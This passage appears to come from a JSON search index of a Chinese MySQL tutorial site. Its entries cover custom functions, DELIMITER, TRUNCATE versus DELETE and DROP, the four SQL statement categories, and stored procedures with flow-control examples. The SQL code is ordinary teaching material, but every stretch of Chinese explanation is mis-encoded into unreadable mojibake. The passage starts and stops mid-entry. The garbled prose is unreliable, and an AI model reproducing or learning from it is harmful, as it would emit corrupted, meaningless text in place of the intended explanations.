hello'; Query OK, 0 rows affected (0.23 sec) mysql> SELECT SPECIFIC_NAME,SQL_DATA_ACCESS, -> ROUTINE_COMMENT FROM information_schema.Routines -> WHERE ROUTINE_NAME='hello'; +---------------+-----------------+-----------------+ | SPECIFIC_NAME | SQL_DATA_ACCESS | ROUTINE_COMMENT | +---------------+-----------------+-----------------+ | hello | READS SQL DATA | print hello | +---------------+-----------------+-----------------+ 1 row in set (0.21 sec) è‹¥è¦ä¿®æ”¹è‡ªå®šä¹‰å‡½æ•°çš„å†…å®¹ï¼Œåˆ™éœ€è¦å…ˆåˆ é™¤è¯¥è‡ªå®šä¹‰å‡½æ•°ï¼Œç„¶åé‡æ–°åˆ›å»ºã€‚ å‚è€ƒ: MySQLä¹‹è‡ªå®šä¹‰å‡½æ•° åˆ é™¤è‡ªå®šä¹‰å‡½æ•° è‡ªå®šä¹‰å‡½æ•°è¢«åˆ›å»ºåï¼Œä¸€ç›´ä¿å­˜åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šä»¥ä¾›ä½¿ç”¨ï¼Œç›´è‡³è¢«åˆ é™¤ã€‚ åˆ é™¤è‡ªå®šä¹‰å‡½æ•°çš„æ–¹æ³•ä¸åˆ é™¤å­˜å‚¨è¿‡ç¨‹çš„æ–¹æ³•åŸºæœ¬ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨ DROP FUNCTION è¯­å¥æ¥å®ç°ã€‚ è¯­æ³•: DROP FUNCTION [ IF EXISTS ] <è‡ªå®šä¹‰å‡½æ•°å> è‡ªå®šä¹‰å‡½æ•°ç›¸å…³è¯­æ³•åŠå˜é‡ å˜é‡å£°æ˜ è¯­æ³•: DECLARE var_name[,...] type [DEFAULT value] å£°æ˜å±€éƒ¨å˜é‡ã€‚è¦ç»™å˜é‡æä¾›ä¸€ä¸ªé»˜è®¤å€¼ï¼Œè¯·åŒ…å«ä¸€ä¸ªDEFAULTå­å¥ã€‚ å€¼å¯ä»¥è¢«æŒ‡å®šä¸ºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œä¸éœ€è¦ä¸ºä¸€ä¸ªå¸¸æ•°ã€‚ å¦‚æœæ²¡æœ‰DEFAULTå­å¥ï¼Œåˆå§‹å€¼ä¸ºNULLã€‚ ä½¿ç”¨è¯­åºä½¿ç”¨ set å’Œ select intoè¯­å¥ä¸ºå˜é‡èµ‹å€¼: set var_name = ''; IF æ¡ä»¶è¯­å¥ è¯­æ³•: IF search_conditionTHEN statement_list [ELSEIF search_conditionTHENstatement_list] ... [ELSE statement_list] ENDIF; CASEè¯­å¥ è¯­æ³•: CASE case_value WHEN when_valueTHENstatement_list [WHEN when_value THENstatement_list] ... [ELSE statement_list] END CASE; å¾ªç¯è¯­å¥ è¯­æ³•: While [begin_label:]WHILEsearch_conditionDO statement_list END WHILE [end_label]; é€€å‡ºæ•´ä¸ªå¾ªç¯ä½¿ç”¨ leave, ç›¸å½“äºbreak é€€å‡ºå½“å‰å¾ªç¯ä½¿ç”¨ iterate, ç›¸å½“äº continue é€šè¿‡é€€å‡ºçš„æ ‡ç­¾å†³å®šé€€å‡ºå“ªä¸ªå¾ªç¯ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Functional-definition.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Functional-definition.html"},{"title":"å…³é”®å­—","text":"æ³¨è§£ Mysqlä¸€èˆ¬éƒ½ä¸åŒºåˆ†å¤§å°å†™, æ¯”å¦‚ desc å’Œ DESC æ˜¯ä¸€è‡´çš„ DELIMITER è¡¨ç¤ºå®šä¹‰ä¸€ä¸ªç»“æŸç¬¦, é»˜è®¤æ˜¯åˆ†å·; å½“æˆ‘ä»¬ä½¿ç”¨å‘½ä»¤è¡Œæ¥å®šä¹‰å‡½æ•°æ—¶å€™, å‡½æ•°å†…éƒ¨çš„è¯­å¥å¾€å¾€éœ€è¦åˆ†å·è¡¨ç¤ºç»“æŸ; ä¼šä¸é»˜è®¤çš„åˆ†å·å†²çª, æ‰€ä»¥å…ˆå®šä¹‰ä¸€ä¸ªå…¶ä»–çš„ç»“æŸç¬¦, å†å†™å‡½æ•°; å¦‚å®šä¹‰ // ä¸ºç»“æŸç¬¦: mysql> delimiter // mysql> CREATE FUNCTION `SHORTEN`(S VARCHAR(255), N INT) mysql> RETURNS varchar(255) mysql> BEGIN mysql> IF ISNULL(S) THEN mysql> RETURN ''; mysql> ELSEIF N<15 THEN mysql> RETURN LEFT(S, N); mysql> ELSE mysql> IF CHAR_LENGTH(S) <=N THEN mysql> RETURN S; mysql> ELSE mysql> RETURN CONCAT(LEFT(S, N-10), '...', RIGHT(S, 5)); mysql> END IF; mysql> END IF; mysql> END;// å¦å¤–, ç”¨å®Œåè®°å¾—è¿˜åŸ, ä¸ç„¶åˆ†å·ç”¨ä¸äº†: delimiter ; DESC DESCRIBE çš„ç®€å†™å½¢å¼ï¼Œç”¨äºè·å–è¡¨çš„ç»“æ„ä¿¡æ¯ã€‚ DESC æˆ– DESCRIBE å‘½ä»¤ç”¨äºæ£€ç´¢æŒ‡å®šè¡¨çš„åˆ—å…ƒæ•°æ®ï¼Œ åŒ…æ‹¬åˆ—åã€æ•°æ®ç±»å‹ã€çº¦æŸæ¡ä»¶ç­‰ã€‚å®ƒæä¾›äº†æœ‰å…³è¡¨çš„ç»“æ„çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¸®åŠ©æ‚¨äº†è§£è¡¨çš„å­—æ®µåŠå…¶å±æ€§ã€‚ ä»¥ä¸‹æ˜¯ä½¿ç”¨ DESC å‘½ä»¤çš„ä¸€èˆ¬è¯­æ³•: DESC $table_name; å…¶ä¸­ï¼Œtable_name æ˜¯è¦æè¿°çš„è¡¨çš„åç§°ã€‚ è¿”å›ä¸€ä¸ªç»“æœé›† Fieldï¼šåˆ—å Typeï¼šåˆ—çš„æ•°æ®ç±»å‹ Nullï¼šæŒ‡ç¤ºåˆ—æ˜¯å¦å…è®¸ NULL å€¼ Keyï¼šæŒ‡ç¤ºåˆ—æ˜¯å¦ä¸ºä¸»é”®æˆ–ç´¢å¼•çš„ä¸€éƒ¨åˆ† Defaultï¼šåˆ—çš„é»˜è®¤å€¼ Extraï¼šå…¶ä»–åˆ—å±æ€§ï¼Œä¾‹å¦‚è‡ªåŠ¨é€’å¢ã€æ³¨é‡Šç­‰ã€‚ DELIMITER å®šä¹‰åˆ†éš”ç¬¦ DEFAULT å¯ä»¥ç”¨åœ¨, å½“æ’å…¥æ•°æ®æ—¶, ä¸æƒ³æ‰‹åŠ¨å†™ä¸»é”®çš„å€¼, å°±å¯ä»¥ç»™default.","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword.html"},{"title":"å…³é”®å­—-truncate","text":"truncate truncateä½¿ç”¨è¯­æ³• truncateçš„ä½œç”¨æ˜¯æ¸…ç©ºè¡¨æˆ–è€…è¯´æ˜¯æˆªæ–­è¡¨ï¼Œåªèƒ½ä½œç”¨äºè¡¨ã€‚ truncateçš„è¯­æ³•å¾ˆç®€å•ï¼Œåé¢ç›´æ¥è·Ÿè¡¨åå³å¯ï¼Œä¾‹å¦‚: truncate table tbl_name æˆ–è€… truncate tbl_name ã€‚ æ‰§è¡Œtruncateè¯­å¥éœ€è¦æ‹¥æœ‰è¡¨çš„dropæƒé™ï¼Œä»é€»è¾‘ä¸Šè®²ï¼Œ truncate tableç±»ä¼¼äºdeleteåˆ é™¤æ‰€æœ‰è¡Œçš„è¯­å¥ æˆ– drop table ç„¶åå† create table è¯­å¥çš„ç»„åˆã€‚ ä¸ºäº†å®ç°é«˜æ€§èƒ½ï¼Œå®ƒç»•è¿‡äº†åˆ é™¤æ•°æ®çš„DMLæ–¹æ³•ï¼Œå› æ­¤ï¼Œå®ƒä¸èƒ½å›æ»šã€‚ å°½ç®¡truncate tableä¸deleteç›¸ä¼¼ï¼Œä½†å®ƒè¢«åˆ†ç±»ä¸ºDDLè¯­å¥è€Œä¸æ˜¯DMLè¯­å¥ã€‚ truncateä¸drop,deleteçš„å¯¹æ¯” ä¸Šé¢è¯´è¿‡truncateä¸deleteï¼Œdropå¾ˆç›¸ä¼¼ï¼Œå…¶å®è¿™ä¸‰è€…è¿˜æ˜¯ä¸å¾ˆå¤§çš„ä¸åŒçš„ï¼Œä¸‹é¢ç®€å•å¯¹æ¯”ä¸‹ä¸‰è€…çš„å¼‚åŒã€‚ truncateä¸dropæ˜¯DDLè¯­å¥ï¼Œæ‰§è¡Œåæ— æ³•å›æ»šï¼› deleteæ˜¯DMLè¯­å¥ï¼Œå¯å›æ»šã€‚ truncateåªèƒ½ä½œç”¨äºè¡¨ï¼›deleteï¼Œdropå¯ä½œç”¨äºè¡¨ã€è§†å›¾ç­‰ã€‚ truncateä¼šæ¸…ç©ºè¡¨ä¸­çš„æ‰€æœ‰è¡Œï¼Œä½†è¡¨ç»“æ„åŠå…¶çº¦æŸã€ç´¢å¼•ç­‰ä¿æŒä¸å˜ï¼› dropä¼šåˆ é™¤è¡¨çš„ç»“æ„åŠå…¶æ‰€ä¾èµ–çš„çº¦æŸã€ç´¢å¼•ç­‰ã€‚ truncateä¼šé‡ç½®è¡¨çš„è‡ªå¢å€¼ï¼›deleteä¸ä¼šã€‚ truncateä¸ä¼šæ¿€æ´»ä¸è¡¨æœ‰å…³çš„åˆ é™¤è§¦å‘å™¨ï¼›deleteå¯ä»¥ã€‚ truncateåä¼šä½¿è¡¨å’Œç´¢å¼•æ‰€å ç”¨çš„ç©ºé—´ä¼šæ¢å¤åˆ°åˆå§‹å¤§å°ï¼› deleteæ“ä½œä¸ä¼šå‡å°‘è¡¨æˆ–ç´¢å¼•æ‰€å ç”¨çš„ç©ºé—´ï¼Œdropè¯­å¥å°†è¡¨æ‰€å ç”¨çš„ç©ºé—´å…¨é‡Šæ”¾æ‰ã€‚ truncateä½¿ç”¨åœºæ™¯åŠæ³¨æ„äº‹é¡¹ é€šè¿‡å‰é¢ä»‹ç»ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¾—å‡ºtruncateè¯­å¥çš„ä½¿ç”¨åœºæ™¯ï¼Œå³è¯¥è¡¨æ•°æ®å®Œå…¨ä¸éœ€è¦æ—¶å¯ä»¥ç”¨truncateã€‚ å¦‚æœæƒ³åˆ é™¤éƒ¨åˆ†æ•°æ®ç”¨deleteï¼Œæ³¨æ„å¸¦ä¸Šwhereå­å¥ï¼› å¦‚æœæƒ³åˆ é™¤è¡¨ï¼Œå½“ç„¶ç”¨dropï¼› å¦‚æœæƒ³ä¿ç•™è¡¨è€Œå°†æ‰€æœ‰æ•°æ®åˆ é™¤ä¸”å’Œäº‹åŠ¡æ— å…³ï¼Œç”¨truncateå³å¯ï¼› å¦‚æœå’Œäº‹åŠ¡æœ‰å…³ï¼Œæˆ–è€…æƒ³è§¦å‘triggerï¼Œè¿˜æ˜¯ç”¨deleteï¼› å¦‚æœæ˜¯æ•´ç†è¡¨å†…éƒ¨çš„ç¢ç‰‡ï¼Œå¯ä»¥ç”¨truncateç„¶åå†é‡æ–°æ’å…¥æ•°æ®ã€‚ æ— è®ºæ€æ ·ï¼Œtruncateè¡¨éƒ½æ˜¯é«˜å±æ“ä½œï¼Œç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒè¦æ›´åŠ å°å¿ƒï¼Œä¸‹é¢åˆ—å‡ºå‡ ç‚¹æ³¨æ„äº‹é¡¹ï¼Œå¸Œæœ›å¤§å®¶ä½¿ç”¨æ—¶å¯ä»¥åšä¸‹å‚è€ƒã€‚ truncateæ— æ³•é€šè¿‡binlogå›æ»šã€‚ truncateä¼šæ¸…ç©ºæ‰€æœ‰æ•°æ®ä¸”æ‰§è¡Œé€Ÿåº¦å¾ˆå¿«ã€‚ truncateä¸èƒ½å¯¹æœ‰å¤–é”®çº¦æŸå¼•ç”¨çš„è¡¨ä½¿ç”¨ã€‚ æ‰§è¡Œtruncateéœ€è¦dropæƒé™ï¼Œä¸å»ºè®®ç»™è´¦å·dropæƒé™ã€‚ æ‰§è¡Œtruncateå‰ä¸€å®šè¦å†ä¸‰æ£€æŸ¥ç¡®è®¤ï¼Œæœ€å¥½æå‰å¤‡ä»½ä¸‹è¡¨æ•°æ®ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword-Truncate.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword-Truncate.html"},{"title":"SQLå››ç§è¯­è¨€: DDL,DML,DCL,TCL","text":"å‚è€ƒ: SQLå››ç§è¯­è¨€ï¼šDDL,DML,DCL,TCL DDL(Data Definition Language) æ•°æ®åº“å®šä¹‰è¯­è¨€(statements are used to define the database structure or schema.) DDLæ˜¯ SQL è¯­è¨€çš„å››å¤§åŠŸèƒ½ä¹‹ä¸€ã€‚ ç”¨äºå®šä¹‰æ•°æ®åº“çš„ä¸‰çº§ç»“æ„ï¼Œ åŒ…æ‹¬å¤–æ¨¡å¼ã€æ¦‚å¿µæ¨¡å¼ã€å†…æ¨¡å¼åŠå…¶ç›¸äº’ä¹‹é—´çš„æ˜ åƒï¼Œå®šä¹‰æ•°æ®çš„å®Œæ•´æ€§ã€å®‰å…¨æ§åˆ¶ç­‰çº¦æŸ é€‚ç”¨èŒƒå›´ï¼šå¯¹æ•°æ®åº“ä¸­çš„æŸäº›å¯¹è±¡(ä¾‹å¦‚ï¼Œdatabase,table)è¿›è¡Œç®¡ç†ï¼Œå¦‚: CREATE ALTER DROP TRUNCATE COMMENT RENAME ä¸¾ä¾‹, åˆ›å»ºæ•°æ®åº“: create database IF NOT EXISTS hncu CHARACTER SET utf8; åˆ›å»ºè¡¨æ ¼: use hncu; create table IF NOT EXISTS stud( id int, name varchar(30), age int ); æ›´æ”¹è¡¨ç»“æ„(è®¾ç½®çº¦æŸ): desc stud; //æŸ¥çœ‹è¡¨ç»“æ„ alter table stud drop column age; alter table stud add column age int; åˆ é™¤è¡¨ã€åˆ é™¤æ•°æ®åº“: drop table stud; drop database hncu; DML(Data Manipulation Language) æ•°æ®æ“çºµè¯­è¨€ (statements are used for managing data within schema objects.) ç”±DBMSæä¾›ï¼Œç”¨äºè®©ç”¨æˆ·æˆ–ç¨‹åºå‘˜ä½¿ç”¨ï¼Œå®ç°å¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ“ä½œã€‚ DMLåˆ†æˆäº¤äº’å‹DMLå’ŒåµŒå…¥å‹DMLä¸¤ç±»ã€‚ ä¾æ®è¯­è¨€çš„çº§åˆ«ï¼ŒDMLåˆå¯åˆ†æˆè¿‡ç¨‹æ€§DMLå’Œéè¿‡ç¨‹æ€§DMLä¸¤ç§ã€‚ é€‚ç”¨èŒƒå›´ï¼šå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œä¸€äº›ç®€å•æ“ä½œï¼Œå¦‚: SELECT INSERT UPDATE DELETE MERGE CALL EXPLAIN PLAN LOCK TABLE ä¸»è¦æŒ‡æ•°æ®çš„å¢åˆ æŸ¥æ”¹: Select/delete/update/insert/call select * from stud; select name,age from stud; //æŸ¥è¯¢æŒ‡å®šçš„åˆ— select name as å§“å, age as å¹´é¾„ from stud; DCL(Data Control Language) æ•°æ®åº“æ§åˆ¶è¯­è¨€æˆæƒï¼Œè§’è‰²æ§åˆ¶ç­‰ GRANT æˆæƒ REVOKE å–æ¶ˆæˆæƒ TCL(Transaction Control Language) äº‹åŠ¡æ§åˆ¶è¯­è¨€ SAVEPOINT è®¾ç½®ä¿å­˜ç‚¹ ROLLBACK å›æ»š SET TRANSACTION SQLä¸»è¦åˆ†æˆå››éƒ¨åˆ† æ•°æ®å®šä¹‰ã€‚ï¼ˆSQL DDLï¼‰ç”¨äºå®šä¹‰SQLæ¨¡å¼ã€åŸºæœ¬è¡¨ã€è§†å›¾å’Œç´¢å¼•çš„åˆ›å»ºå’Œæ’¤æ¶ˆæ“ä½œã€‚ æ•°æ®æ“çºµã€‚ï¼ˆSQL DMLï¼‰æ•°æ®æ“çºµåˆ†æˆæ•°æ®æŸ¥è¯¢å’Œæ•°æ®æ›´æ–°ä¸¤ç±»ã€‚æ•°æ®æ›´æ–°åˆåˆ†æˆæ’å…¥ã€åˆ é™¤ã€å’Œä¿®æ”¹ä¸‰ç§æ“ä½œã€‚ æ•°æ®æ§åˆ¶ã€‚åŒ…æ‹¬å¯¹åŸºæœ¬è¡¨å’Œè§†å›¾çš„æˆæƒï¼Œå®Œæ•´æ€§è§„åˆ™çš„æè¿°ï¼Œäº‹åŠ¡æ§åˆ¶ç­‰å†…å®¹ã€‚ åµŒå…¥å¼SQLçš„ä½¿ç”¨è§„å®šã€‚æ¶‰åŠåˆ°SQLè¯­å¥åµŒå…¥åœ¨å®¿ä¸»è¯­è¨€ç¨‹åºä¸­ä½¿ç”¨çš„è§„åˆ™ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-SQL-four-languages-DDL,-DML,-DCL,-TCL.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-SQL-four-languages-DDL,-DML,-DCL,-TCL.html"},{"title":"å­˜å‚¨è¿‡ç¨‹","text":"MySQL5.0 ç‰ˆæœ¬å¼€å§‹æ”¯æŒå­˜å‚¨è¿‡ç¨‹ã€‚ å¦‚æœåœ¨å®ç°ç”¨æˆ·çš„æŸäº›éœ€æ±‚æ—¶ï¼Œéœ€è¦ç¼–å†™ä¸€ç»„å¤æ‚çš„SQLè¯­å¥æ‰èƒ½å®ç°ï¼Œ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†è¿™ç»„å¤æ‚çš„SQLè¯­å¥é›†æå‰ç¼–å†™åœ¨æ•°æ®åº“ä¸­ï¼Œ ç”±JDBCè°ƒç”¨æ¥æ‰§è¡Œè¿™ç»„SQLè¯­å¥ã€‚ æŠŠç¼–å†™åœ¨æ•°æ®åº“ä¸­çš„SQLè¯­å¥é›†ç§°ä¸ºå­˜å‚¨è¿‡ç¨‹ã€‚ å­˜å‚¨è¿‡ç¨‹ï¼ˆPROCEDUREï¼‰ äº‹å…ˆç»è¿‡ç¼–è¯‘å¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„ä¸€æ®µSQLè¯­å¥çš„é›†åˆã€‚ è°ƒç”¨å­˜å‚¨è¿‡ç¨‹å¯ä»¥ç®€åŒ–åº”ç”¨å¼€å‘äººå‘˜çš„å¾ˆå¤šå·¥ä½œï¼Œ å‡å°‘æ•°æ®åœ¨æ•°æ®åº“å’Œåº”ç”¨æœåŠ¡å™¨ä¹‹é—´çš„ä¼ è¾“ï¼Œå¯¹äºæé«˜æ•°æ®å¤„ç†çš„æ•ˆç‡æ˜¯å¾ˆæœ‰å¥½å¤„çš„ ç®€å•ç†è§£å°±æ˜¯æ•°æ®åº“ SQL è¯­è¨€å±‚é¢çš„ä»£ç å°è£…ä¸é‡ç”¨ã€‚ ç±»ä¼¼äºJavaä¸­çš„æ–¹æ³•ï¼Œéœ€è¦å…ˆå®šä¹‰ï¼Œä½¿ç”¨æ—¶éœ€è¦è°ƒç”¨ã€‚ å­˜å‚¨è¿‡ç¨‹å¯ä»¥å®šä¹‰å‚æ•°ï¼Œå‚æ•°åˆ†ä¸ºINã€OUTã€INOUTç±»å‹ä¸‰ç§ç±»å‹ INç±»å‹çš„å‚æ•°è¡¨ç¤ºæ¥å—è°ƒç”¨è€…ä¼ å…¥çš„æ•°æ®ï¼› OUTç±»å‹çš„å‚æ•°è¡¨ç¤ºå‘è°ƒç”¨è€…è¿”å›æ•°æ®ï¼› INOUTç±»å‹çš„å‚æ•°å³å¯ä»¥æ¥å—è°ƒç”¨è€…ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå¯ä»¥å‘è°ƒç”¨è€…è¿”å›æ•°æ®ã€‚ ä¼˜ç‚¹ å­˜å‚¨è¿‡ç¨‹å¯å°è£…ï¼Œå¹¶éšè—å¤æ‚çš„å•†ä¸šé€»è¾‘ã€‚ å­˜å‚¨è¿‡ç¨‹å¯ä»¥å›ä¼ å€¼ï¼Œå¹¶å¯ä»¥æ¥å—å‚æ•°ã€‚ å­˜å‚¨è¿‡ç¨‹æ— æ³•ä½¿ç”¨ SELECT æŒ‡ä»¤æ¥è¿è¡Œï¼Œå› ä¸ºå®ƒæ˜¯å­ç¨‹åºï¼Œä¸æŸ¥çœ‹è¡¨ï¼Œæ•°æ®è¡¨æˆ–ç”¨æˆ·å®šä¹‰å‡½æ•°ä¸åŒã€‚ å­˜å‚¨è¿‡ç¨‹å¯ä»¥ç”¨åœ¨æ•°æ®æ£€éªŒï¼Œå¼ºåˆ¶å®è¡Œå•†ä¸šé€»è¾‘ç­‰ã€‚ ç¼ºç‚¹ å­˜å‚¨è¿‡ç¨‹ï¼Œå¾€å¾€å®šåˆ¶åŒ–äºç‰¹å®šçš„æ•°æ®åº“ä¸Šï¼Œå› ä¸ºæ”¯æŒçš„ç¼–ç¨‹è¯­è¨€ä¸åŒã€‚ å½“åˆ‡æ¢åˆ°å…¶ä»–å‚å•†çš„æ•°æ®åº“ç³»ç»Ÿæ—¶ï¼Œéœ€è¦é‡å†™åŸæœ‰çš„å­˜å‚¨è¿‡ç¨‹ã€‚ å­˜å‚¨è¿‡ç¨‹çš„æ€§èƒ½è°ƒæ ¡ä¸æ’°å†™ï¼Œå—é™äºå„ç§æ•°æ®åº“ç³»ç»Ÿã€‚ ç¼–å†™ åŸºæœ¬è¯­å¥æ ¼å¼: DELIMITER $$ CREATE /*[DEFINER = { user | CURRENT_USER }]*/ PROCEDURE æ•°æ®åº“å.å­˜å‚¨è¿‡ç¨‹å([inå˜é‡å ç±»å‹,out å‚æ•° 2ï¼Œ...]) /*LANGUAGE SQL | [NOT] DETERMINISTIC | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER } | COMMENT 'string'*/ BEGIN [DECLARE å˜é‡å ç±»å‹ [DEFAULT å€¼];] å­˜å‚¨è¿‡ç¨‹çš„è¯­å¥å—; END$$ DELIMITER ; å­˜å‚¨è¿‡ç¨‹ä¸­çš„è¯­å¥å¿…é¡»åŒ…å«åœ¨BEGINå’ŒENDä¹‹é—´ DECLAREä¸­ç”¨æ¥å£°æ˜å˜é‡ï¼Œå˜é‡é»˜è®¤èµ‹å€¼ä½¿ç”¨çš„DEFAULTï¼Œè¯­å¥å—ä¸­æ”¹å˜å˜é‡å€¼ï¼Œä½¿ç”¨SET å˜é‡=å€¼ï¼› å­˜å‚¨ä½ç½® å­˜å‚¨è¿‡ç¨‹çš„ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ information_schema æ•°æ®åº“ä¸‹çš„ Routines è¡¨ä¸­ï¼Œ å¯ä»¥é€šè¿‡æŸ¥è¯¢è¯¥è¡¨çš„è®°å½•æ¥æŸ¥è¯¢å­˜å‚¨è¿‡ç¨‹çš„ä¿¡æ¯ï¼ŒSQL è¯­å¥å¦‚ä¸‹: SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME=å­˜å‚¨è¿‡ç¨‹å; å‚è€ƒ: MySQLæŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹ è°ƒç”¨ è¯­æ³•: CALL æ•°æ®åº“å.å­˜å‚¨è¿‡ç¨‹å(å‚æ•°åˆ—è¡¨); ç¤ºä¾‹: DELIMITER $$ CREATE PROCEDURE `demo`.`demo2`(IN s_sex CHAR(1),OUT s_count INT) -- å­˜å‚¨è¿‡ç¨‹ä½“ BEGIN -- æŠŠSQLä¸­æŸ¥è¯¢çš„ç»“æœé€šè¿‡INTOèµ‹ç»™å˜é‡ SELECT COUNT(*) INTO s_count FROM student WHERE sex= s_sex; SELECT s_count; END$$ DELIMITER ; è°ƒç”¨è¿™ä¸ªå­˜å‚¨è¿‡ç¨‹: -- @s_countè¡¨ç¤ºæµ‹è¯•å‡ºè¾“å‡ºçš„å‚æ•° CALL demo2 ('ç”·',@s_count); å­˜å‚¨è¿‡ç¨‹ç®¡ç† æ˜¾ç¤º: SHOW PROCEDURE STATUS æ˜¾ç¤ºç‰¹å®šæ•°æ®åº“çš„å­˜å‚¨è¿‡ç¨‹: SHOW PROCEDURE STATUS WHERE db = 'dbåå­—' AND NAME = 'nameåå­—'; æ˜¾ç¤ºç‰¹å®šæ¨¡å¼çš„å­˜å‚¨è¿‡ç¨‹: SHOW PROCEDURE STATUS WHERE NAME LIKE '%mo%'; æ˜¾ç¤ºå­˜å‚¨è¿‡ç¨‹çš„æºç : SHOW CREATE PROCEDURE å­˜å‚¨è¿‡ç¨‹å; åˆ é™¤å­˜å‚¨è¿‡ç¨‹: DROP PROCEDURE å­˜å‚¨è¿‡ç¨‹å; æµç¨‹æ§åˆ¶è¯­å¥ IF ELSE IF è¯­å¥åŒ…å«å¤šä¸ªæ¡ä»¶åˆ¤æ–­ï¼Œæ ¹æ®ç»“æœä¸º TRUEã€FALSEæ‰§è¡Œè¯­å¥ï¼Œ ä¸ç¼–ç¨‹è¯­è¨€ä¸­çš„ ifã€else ifã€else è¯­æ³•ç±»ä¼¼: DELIMITER $$ CREATE PROCEDURE `demo`.`demo3`(IN `day` INT) -- å­˜å‚¨è¿‡ç¨‹ä½“ BEGIN IF `day` = 0 THEN SELECT 'æ˜ŸæœŸå¤©'; ELSEIF `day` = 1 THEN SELECT 'æ˜ŸæœŸä¸€'; ELSEIF `day` = 2 THEN SELECT 'æ˜ŸæœŸäºŒ'; ELSE SELECT 'æ— æ•ˆæ—¥æœŸ'; END IF; END$$ DELIMITER ; æ¡ä»¶æ§åˆ¶è¯­å¥ CASE ç±»ä¼¼äºJavaçš„ switch() case , ä¸è¿‡Mysqlä¸­, æ˜¯ case xx when ç±»ä¼¼IFçš„è°ƒç”¨: DELIMITER $$ CREATE PROCEDURE demo4(IN num INT) BEGIN CASE -- æ¡ä»¶å¼€å§‹ WHEN num<0 THEN SELECT 'è´Ÿæ•°'; WHEN num>0 THEN SELECT 'æ­£æ•°'; ELSE SELECT 'ä¸æ˜¯æ­£æ•°ä¹Ÿä¸æ˜¯è´Ÿæ•°'; END CASE; -- æ¡ä»¶ç»“æŸ END$$ DELIMITER; ç±»ä¼¼Javaçš„switchè°ƒç”¨: DELIMITER $$ CREATE PROCEDURE demo5(IN num INT) BEGIN CASE num -- æ¡ä»¶å¼€å§‹ WHEN 1 THEN SELECT 'è¾“å…¥ä¸º1'; WHEN 0 THEN SELECT 'è¾“å…¥ä¸º0'; ELSE SELECT 'ä¸æ˜¯1ä¹Ÿä¸æ˜¯0'; END CASE; -- æ¡ä»¶ç»“æŸ END$$ DELIMITER; å¾ªç¯è¯­å¥ WHILE ç±»ä¼¼äºå…¶ä»–è¯­è¨€çš„while: DELIMITER $$ CREATE PROCEDURE demo6(IN num INT,OUT SUM INT) BEGIN SET SUM = 0; WHILE num<10 DO -- å¾ªç¯å¼€å§‹ SET num = num+1; SET SUM = SUM+num; END WHILE; -- å¾ªç¯ç»“æŸ END$$ DELIMITER; è°ƒç”¨: -- è°ƒç”¨å‡½æ•° CALL demo6(0,@sum); -- æŸ¥è¯¢å‡½æ•° SELECT @sum; å¾ªç¯è¯­å¥ REPEAT UNTLL REPEATEâ€¦UNTLL è¯­å¥çš„ç”¨æ³•å’Œ Javaä¸­çš„ doâ€¦while è¯­å¥ç±»ä¼¼ï¼Œ éƒ½æ˜¯å…ˆæ‰§è¡Œå¾ªç¯æ“ä½œï¼Œå†åˆ¤æ–­æ¡ä»¶ï¼Œ åŒºåˆ«æ˜¯REPEATE è¡¨è¾¾å¼å€¼ä¸º falseæ—¶æ‰æ‰§è¡Œå¾ªç¯æ“ä½œï¼Œç›´åˆ°è¡¨è¾¾å¼å€¼ä¸º trueåœæ­¢: -- åˆ›å»ºè¿‡ç¨‹ DELIMITER $$ CREATE PROCEDURE demo7(IN num INT,OUT SUM INT) BEGIN SET SUM = 0; REPEAT-- å¾ªç¯å¼€å§‹ SET num = num+1; SET SUM = SUM+num ; UNTIL num>=10 END REPEAT; -- å¾ªç¯ç»“æŸ END$$ DELIMITER; è°ƒç”¨: CALL demo7(9,@sum); SELECT @sum; å¾ªç¯è¯­å¥ LOOP å¾ªç¯è¯­å¥ï¼Œç”¨æ¥é‡å¤æ‰§è¡ŒæŸäº›è¯­å¥ã€‚ æ‰§è¡Œè¿‡ç¨‹ä¸­å¯ä½¿ç”¨ LEAVEè¯­å¥æˆ–è€…ITEREATEæ¥è·³å‡ºå¾ªç¯ï¼Œä¹Ÿå¯ä»¥åµŒå¥—IFç­‰åˆ¤æ–­è¯­å¥ã€‚ LEAVE è¯­å¥æ•ˆæœå¯¹äºJavaä¸­çš„breakï¼Œç”¨æ¥ç»ˆæ­¢å¾ªç¯ï¼› ITERATEè¯­å¥æ•ˆæœç›¸å½“äºJavaä¸­çš„continueï¼Œç”¨æ¥è·³è¿‡æ­¤æ¬¡å¾ªç¯ã€‚è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚ä¸”ITERATEä¹‹ä¸‹çš„è¯­å¥å°†ä¸åœ¨è¿›è¡Œã€‚ ä¾‹å¦‚: DELIMITER $$ CREATE PROCEDURE demo8(IN num INT,OUT SUM INT) BEGIN SET SUM = 0; demo_sum:LOOP-- å¾ªç¯å¼€å§‹ SET num = num+1; IF num > 10 THEN LEAVE demo_sum; -- ç»“æŸæ­¤æ¬¡å¾ªç¯ ELSEIF num <= 9 THEN ITERATE demo_sum; -- 